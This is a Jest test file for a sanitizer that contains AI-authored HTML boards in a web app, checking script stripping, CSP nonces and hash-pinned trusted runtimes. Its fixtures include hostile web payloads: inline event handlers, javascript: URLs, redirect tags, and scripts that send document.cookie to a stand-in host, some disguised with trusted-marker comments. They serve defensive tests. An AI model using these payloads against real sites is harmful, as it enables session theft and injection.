import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import {
  buildSafeDesignerSrcdoc,
  isTrustedScriptBlock,
  sha256Hex,
  TRUSTED_RUNTIMES,
} from '../designer-safe-srcdoc';

/**
 * W0-02 (audit 2026-07-12) — render-side containment for AI-authored board
 * HTML. Runnable with: pnpm --filter web exec jest src/lib/designer-safe-srcdoc
 *
 * This is the belt-and-suspenders layer (the API-side sanitizeDesignerHtml is
 * the primary strip, gated by designer-prompt.spec.ts). It contains LEGACY
 * persisted boards that were saved before the source strip existed.
 *
 * 2026-08-02 (INJ-004) — the trust decision is no longer "the block contains a
 * marker somewhere". These tests pin the new rule: leading-comment anchor +
 * byte-exact body.
 */

/** Pull `export const NAME = "…" + "…";` out of the API source and evaluate it. */
function apiConstant(name: string): string {
  const src = fs.readFileSync(
    path.join(__dirname, '../../../../../apps/api/src/ai/designer-edit-shim.ts'),
    'utf8',
  );
  const m = src.match(new RegExp('export const ' + name + ' =([\\s\\S]*?);\\n'));
  if (!m) throw new Error('could not find ' + name + ' in designer-edit-shim.ts');
  // eslint-disable-next-line no-eval
  return eval(m[1]) as string;
}
function scriptBody(block: string): string {
  const m = block.match(/^<script\b[^>]*>([\s\S]*)<\/script\s*>$/i);
  if (!m) throw new Error('not a script block');
  return m[1];
}

const REAL_EDIT_SHIM = apiConstant('DESIGNER_EDIT_SHIM');
const REAL_FIT_ENGINE = apiConstant('DESIGNER_LAYOUT_ENGINE');
/** The one statement EDUCMS-SHIM-V7 adds to V6 (2026-09-23). */
const PARENT_ONLY_GUARD = 'if(e.source!==window.parent)return;';

const MALICIOUS = [
  '<!doctype html><html><head><style>.s{color:red}</style></head>',
  '<body><div class="stage" style="width:1920px;height:1080px">',
  '<h1 data-field="headline" onclick="evil()">Hi</h1>',
  // model script that posts a player action on load — the P0 vector
  '<script>parent.postMessage({type:"educms-action",action:{type:"open-url",target:"https://evil.example"}},"*")</script>',
  // trusted runtimes that MUST survive (nonce-stamped) — the REAL bodies,
  // exactly as the API bakes them into a persisted board.
  REAL_EDIT_SHIM,
  '<script>/*VOS-CANVAS*/window.__VOS_CW=1920;window.__VOS_CH=1080;</script>',
  '<a href="javascript:alert(1)">x</a>',
  '<svg onload="fetch(String.fromCharCode(104))"></svg>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<iframe src="https://evil.example"></iframe>',
  '</div></body></html>',
].join('');

describe('buildSafeDesignerSrcdoc (W0-02 containment)', () => {
  const out = buildSafeDesignerSrcdoc(MALICIOUS);

  it('strips the model action-posting script', () => {
    // The model's payload is gone outright.
    expect(out).not.toContain('evil.example');
    // `educms-action` alone is no longer proof of a leak: the TRUSTED baked
    // shim legitimately posts that message now (a `[data-action]` hot zone the
    // operator wired). So assert the real property — every surviving mention
    // lives INSIDE the trusted shim body, and nothing the model authored does.
    // (Defense in depth: even a surviving model script could not act, because
    // the player resolves `savedActions[key]` from the operator's saved map and
    // ignores the message's own action object — W0-02, player/page.tsx:7075.)
    // Nonce-agnostic: the baked shim is stamped with a per-render nonce, so it
    // never string-matches REAL_EDIT_SHIM. Walk the script blocks instead and
    // require that any block mentioning the message is the trusted shim itself.
    const blocks = out.split('<script').filter((b) => b.includes('educms-action'));
    expect(blocks.length).toBeGreaterThan(0); // the trusted emit must survive
    for (const b of blocks) expect(b).toContain('EDUCMS-SHIM-V7');
  });
  it('strips on* handler attributes (onclick, svg onload)', () => {
    expect(out).not.toMatch(/onclick=|onload=/i);
  });
  it('neutralizes javascript: URLs', () => {
    expect(out).not.toContain('javascript:alert');
  });
  it('strips meta refresh, <base>, and nested frames', () => {
    expect(out).not.toMatch(/http-equiv=["']?refresh/i);
    expect(out).not.toMatch(/<base|<iframe/i);
  });
  it('keeps the trusted baked runtimes (nonce-stamped)', () => {
    expect(out).toContain('__VOS_CW=1920');
    const nonce = (out.match(/script-src 'nonce-([a-f0-9]+)'/) || [])[1];
    expect(nonce).toBeTruthy();
    expect(out).toContain(`<script nonce="${nonce}">/*EDUCMS-SHIM-V7*/`);
    expect(out).toContain(`<script nonce="${nonce}">/*VOS-CANVAS*/`);
  });
  it('injects the trusted VOS-STAGE-SCALE runtime with the render nonce', () => {
    const nonce = (out.match(/script-src 'nonce-([a-f0-9]+)'/) || [])[1];
    expect(out).toContain(`<script nonce="${nonce}">/*VOS-STAGE-SCALE*/`);
  });
  it('injects a strict CSP (default-src none; no connect-src)', () => {
    expect(out).toContain("default-src 'none'");
    expect(out).not.toMatch(/connect-src/);
  });
  it('preserves styles and editability hooks', () => {
    expect(out).toContain('.s{color:red}');
    expect(out).toContain('data-field="headline"');
  });
  it('mints a fresh nonce per render', () => {
    const a = (buildSafeDesignerSrcdoc(MALICIOUS).match(/nonce-([a-f0-9]+)/) || [])[1];
    const b = (buildSafeDesignerSrcdoc(MALICIOUS).match(/nonce-([a-f0-9]+)/) || [])[1];
    expect(a).toBeTruthy();
    expect(b).toBeTruthy();
    expect(a).not.toBe(b);
  });
});

// ── INJ-004: the marker-as-comment bypass ───────────────────────────────────
describe('INJ-004 — trust is structural, not substring', () => {
  it('does NOT trust a hostile block that merely CONTAINS a marker in a comment', () => {
    const evil = "<script>fetch('https://evil.example/'+document.cookie); /* EDUCMS-SHIM-V6 */</script>";
    expect(isTrustedScriptBlock(evil)).toBe(false);

    const out = buildSafeDesignerSrcdoc('<html><head></head><body>' + evil + '</body></html>');
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('document.cookie');
  });

  it('does NOT trust a block that merely PREFIXES the marker comment onto other code', () => {
    for (const marker of ['EDUCMS-SHIM-V6', 'EDUCMS-SHIM-V7']) {
      const evil = `<script>/*${marker}*/fetch('https://evil.example')</script>`;
      expect(isTrustedScriptBlock(evil)).toBe(false);
      expect(buildSafeDesignerSrcdoc(evil)).not.toContain('evil.example');
    }
  });

  it('does NOT trust the real V7 with one byte changed — a body is trusted by its exact hash', () => {
    const tampered = REAL_EDIT_SHIM.replace('if(e.source!==window.parent)return;', 'if(e.source===null)return;');
    expect(tampered).not.toBe(REAL_EDIT_SHIM);
    expect(isTrustedScriptBlock(tampered)).toBe(false);
    expect(buildSafeDesignerSrcdoc('<html><head>' + tampered + '</head><body></body></html>')).not.toContain('EDUCMS-SHIM-V7');
  });

  it('does NOT trust a block with code BEFORE the marker comment', () => {
    const evil = "<script>evil();/*VOS-FIT-ENGINE*/</script>";
    expect(isTrustedScriptBlock(evil)).toBe(false);
  });

  it('does NOT trust a VOS-CANVAS block carrying anything but the two integer assignments', () => {
    expect(isTrustedScriptBlock('<script>/*VOS-CANVAS*/window.__VOS_CW=1;fetch("x");</script>')).toBe(false);
    expect(isTrustedScriptBlock('<script>/*VOS-CANVAS*/window.__VOS_CW=1920;</script>')).toBe(true);
    expect(isTrustedScriptBlock('<script>/*VOS-CANVAS*/window.__VOS_CW=1920;window.__VOS_CH=1080;</script>')).toBe(true);
  });

  it('DOES trust the real, byte-exact runtimes the API bakes in', () => {
    expect(isTrustedScriptBlock(REAL_EDIT_SHIM)).toBe(true);
    expect(isTrustedScriptBlock(REAL_FIT_ENGINE)).toBe(true);
  });

  it('a hostile block is never CSP-nonce-stamped (no signing oracle)', () => {
    const evil = "<script>/*VOS-STAGE-SCALE*/parent.postMessage({type:'educms-action'},'*')</script>";
    const out = buildSafeDesignerSrcdoc('<html><head></head><body>' + evil + '</body></html>');
    // the only nonce-stamped scripts are our own runtimes — the two this
    // module injects (VOS-STAGE-SCALE, and since 2026-09-23 VOS-LIVE-MENU)
    const stamped = out.match(/<script nonce="[a-f0-9]+">\/\*[A-Z0-9-]+\*\//g) || [];
    expect(stamped.map((s) => s.replace(/^.*\/\*|\*\/$/g, ''))).toEqual(['VOS-STAGE-SCALE', 'VOS-LIVE-MENU']);
    expect((out.match(/<script nonce="[a-f0-9]+">/g) || []).length).toBe(2);
    expect(out).not.toContain("postMessage({type:'educms-action'}");
  });
});

// ── Drift guard: the registry must always cover the CURRENT API bodies ──────
describe('INJ-004 — registry drift guard', () => {
  const entry = (marker: string) => TRUSTED_RUNTIMES.find((r) => r.marker === marker)!;

  it('registry pins the current EDUCMS-SHIM-V7 body', () => {
    const digest = sha256Hex(scriptBody(REAL_EDIT_SHIM));
    expect(entry('EDUCMS-SHIM-V7').hashes).toContain(digest);
  });

  it('V7 is the last V6 plus the parent-only guard — nothing else, byte for byte', () => {
    // Take the one statement back out and put the V6 marker back: what is left
    // must be EXACTLY the last V6 ever baked (the body every board kept between
    // 2026-09-12 and V7 carries) — and that body must still be pinned.
    const v7 = scriptBody(REAL_EDIT_SHIM);
    expect(v7.indexOf('/*EDUCMS-SHIM-V7*/')).toBe(0);
    expect(v7.split(PARENT_ONLY_GUARD).length - 1).toBe(1);
    const v6 = '/*EDUCMS-SHIM-V6*/' + v7.slice('/*EDUCMS-SHIM-V7*/'.length).replace(PARENT_ONLY_GUARD, '');
    const LAST_V6 = 'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79';
    expect(sha256Hex(v6)).toBe(LAST_V6);
    expect(entry('EDUCMS-SHIM-V6').hashes).toContain(LAST_V6);
  });

  it('every V6 body ever pinned stays pinned (saved boards carry them)', () => {
    expect(entry('EDUCMS-SHIM-V6').hashes).toEqual([
      'cd11aff07ab7d8afb3c597fa27f5f4ce3fee0a62cf23874b0b1d1cb72194dc79',
      '1ae3e413f28c9e8bfe4d106a84ff13e79eeceae8a6d7c6db97035a78db73a574',
      'cf2a1204382b12dc2978eee7ce0b62d0ffca6c49b6e133b130715acacc6c066b',
    ]);
  });

  it('registry pins the current VOS-FIT-ENGINE body', () => {
    const digest = sha256Hex(scriptBody(REAL_FIT_ENGINE));
    expect(entry('VOS-FIT-ENGINE').hashes).toContain(digest);
  });
});

// ── The hand-rolled SHA-256 must actually be SHA-256 ────────────────────────
describe('sha256Hex', () => {
  const cases = [
    '',
    'abc',
    'a'.repeat(55),
    'a'.repeat(56),
    'a'.repeat(64),
    'a'.repeat(1000),
    'héllo — wörld · 中文 · 🎄🎃',
    JSON.stringify({ nested: [1, 2, 3], s: 'x'.repeat(300) }),
  ];
  it.each(cases)('matches node crypto for %#', (input) => {
    expect(sha256Hex(input)).toBe(crypto.createHash('sha256').update(input, 'utf8').digest('hex'));
  });
  it('matches node crypto for the real runtime bodies', () => {
    for (const b of [scriptBody(REAL_EDIT_SHIM), scriptBody(REAL_FIT_ENGINE)]) {
      expect(sha256Hex(b)).toBe(crypto.createHash('sha256').update(b, 'utf8').digest('hex'));
    }
  });
});
